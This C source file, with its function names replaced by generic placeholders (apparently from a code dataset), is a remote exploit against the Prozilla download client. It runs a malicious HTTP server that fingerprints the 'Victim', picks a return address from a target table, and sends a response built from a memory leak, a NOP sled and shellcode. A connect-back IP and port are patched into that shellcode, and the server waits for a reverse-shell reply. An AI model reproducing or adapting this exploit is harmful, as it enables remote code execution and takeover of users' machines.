#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct sockaddr_in {int /*<<< orphan*/  sin_addr; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  client_request ;
struct TYPE_2__ {char* dist; int ret; } ;

/* Variables and functions */
 int EOF ; 
 int MAX_RESPONSE ; 
 scalar_t__ TRUE ; 
 int FUNC0 (int,struct sockaddr*,int*) ; 
 int FUNC1 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int FUNC4 (int,int,int) ; 
 scalar_t__ FUNC5 () ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC7 (struct sockaddr_in*) ; 
 int FUNC8 (int,char**,char*) ; 
 char* FUNC9 (int /*<<< orphan*/ ) ; 
 int FUNC10 (struct sockaddr_in*,struct sockaddr_in*,int*) ; 
 scalar_t__ FUNC11 (int) ; 
 int /*<<< orphan*/  FUNC12 (char*,int,int) ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  FUNC13 (char*) ; 
 int /*<<< orphan*/  FUNC14 (char*) ; 
 scalar_t__ FUNC15 (int,char*,int) ; 
 int /*<<< orphan*/  real_response ; 
 int FUNC16 (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC17 (int) ; 
 int /*<<< orphan*/  FUNC18 (int) ; 
 int /*<<< orphan*/  FUNC19 (int,int) ; 
 int /*<<< orphan*/  FUNC20 (int) ; 
 int /*<<< orphan*/  FUNC21 (int) ; 
 int /*<<< orphan*/  shellcode ; 
 int /*<<< orphan*/  FUNC22 (int /*<<< orphan*/ ,char*,int*,int*,int*,int*) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC23 (int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC24 (char*,char*) ; 
 TYPE_1__* targets ; 
 int /*<<< orphan*/  FUNC25 (char*) ; 

int FUNC26(int argc,char **argv)
{
    /* ip patch position */
    int i=194;
    int opt_p=0,opt_c=0,opt_t=1;
    int port,porthigh,portlow;
    int c,f;
    int control;
    int connection,from_len;
    int ip1,ip2,ip3,ip4;
    char http_response [2048];
    char client_request[2048];
    struct sockaddr_in *control_addr = (struct sockaddr_in *)FUNC11(sizeof(struct sockaddr_in));
    struct sockaddr_in *from_addr = (struct sockaddr_in *)FUNC11(sizeof(struct sockaddr_in));
    
    while((c=FUNC8(argc, argv ,"hc:p:t:"))!=EOF) {
            switch (c) {
                case 'h':
                    FUNC25(argv[0]);
                case 'c':
                    opt_c=1;
                    FUNC22(optarg, "%d.%d.%d.%d", &ip1, &ip2, &ip3,&ip4);
                    break;
                case 'p':
                    opt_p=1;
                    port = FUNC1(optarg);
                    if ((port <= 0) || (port > 65535)) {
                        FUNC6(stderr, "Invalid port.\n\n");
                        FUNC3(1);
                    }
                    break;
                case 't':
                    opt_t = FUNC1(optarg);
                    if ((opt_t < 1 || opt_t > 6)) {
                        opt_t = 1;
                        FUNC6(stderr,"[+] Default Target [ %s 0x%.08x]\n",targets[opt_t-1].dist,targets[opt_t-1].ret);
                    }
                    else {
                        FUNC6(stderr,"[+] Target [ %s 0x%.08x]\n",targets[opt_t-1].dist,targets[opt_t-1].ret);
                    }
                    break;
            }
    }
    
    if(opt_p) {
        porthigh = (port & 0xff00) >> 8;
        portlow = (port & 0x00ff);
    }
    else {
        port = 8080;
        porthigh = (port & 0xff00) >> 8;
        portlow = (port & 0x00ff);
    }
    if(!opt_c) {
        FUNC25(argv[0]);
    }
    FUNC12(http_response,0x0,MAX_RESPONSE);
    control = FUNC10(control_addr,from_addr,&from_len);
    
    /* patch ip */
    i = FUNC4(ip1,i,6);
    i = FUNC4(ip2,i,6);
    i = FUNC4(ip3,i,6);
    i = FUNC4(ip4,i,6);

    /* patch port */
    i = 207;
    i = FUNC4( porthigh,i,5);
    i = FUNC4( portlow ,i,5);
    
    
    while(TRUE) {
        if((connection=FUNC0(control,(struct sockaddr *)from_addr,&from_len))==-1) {
            FUNC3(1);
        }
        
        FUNC6(stderr,"[+] Victim at : %s\n", FUNC9(from_addr->sin_addr));
        if (FUNC15(connection,client_request,sizeof(client_request))==0) {
            FUNC3(1);
        }
        
        /* Victim Responded */
        if(FUNC24(client_request,"Prozilla"))
        {
            FUNC6(stderr,"[+] Victim using Prozilla.\n");
            f=1;
        }
        else {
            if(FUNC24(client_request,"SSSS")) {
                FUNC6(stderr,"Nice , Victim Responded!\n");
                FUNC21(connection);
            }
            else {
                FUNC6(stderr,"[+] Victim is not using Prozilla! Sending a normal response.\n");
                if(FUNC16(connection,real_response,FUNC23(shellcode),0)==-1) {
                    FUNC13("send");
                }
            }
        }
        
        if(f==1) {
            /* HTTP */
            FUNC19(connection,opt_t);
            /* Memleak - Nop sled */
            FUNC18(connection);
            FUNC20(connection);
            /* HTTP END */
            FUNC17(connection);
            f=0;
        }
        
        FUNC2(connection);
        FUNC12(client_request,0x0,sizeof(client_request));

        if (FUNC5()==0) {
            FUNC7(from_addr);
            FUNC7(control_addr);
            FUNC3(0);
        }
        else {
            FUNC2(connection);
        }

    }

    FUNC14("Done");
    return 0;
}